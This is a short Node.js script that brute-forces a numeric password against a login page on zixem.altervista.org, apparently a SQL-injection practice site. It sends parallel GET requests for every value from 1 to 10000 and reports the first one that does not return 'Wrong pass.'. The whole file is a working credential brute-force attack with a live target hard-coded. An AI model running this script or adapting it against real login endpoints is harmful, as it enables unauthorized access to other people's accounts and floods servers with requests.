const https = require("https");

function httpsGet(url) {
  return new Promise((resolve, reject) => {
    https
      .get(url, (res) => {
        let data = "";

        res.on("data", (chunk) => {
          data += chunk;
        });

        res.on("end", () => {
          resolve(data);
        });
      })
      .on("error", (err) => {
        reject(err);
      });
  });
}

(async () => {
  const STEP = 50;
  const START = 1;
  const END = 10000;
  const TOTAL_NUMBER = END - START;

  let checked = 0;
  for (let p = START; p < END; p += STEP) {
    const passwords = Array.from({ length: (p + STEP) - p + 1 }, (_, i) => p + i);

    await Promise.all(
      passwords.map(async (password) => {
        const url = `https://www.zixem.altervista.org/SQLi/login_do.php?pass=${password}`;
        const result = await httpsGet(url);
        if (!result.includes("Wrong pass.")) {
          console.log(`Success: ${password}`);
          process.exit(0);
        }
      })
    );

    checked += STEP;
    console.log(`Checked: ${checked} from ${TOTAL_NUMBER}`);
  }
})();
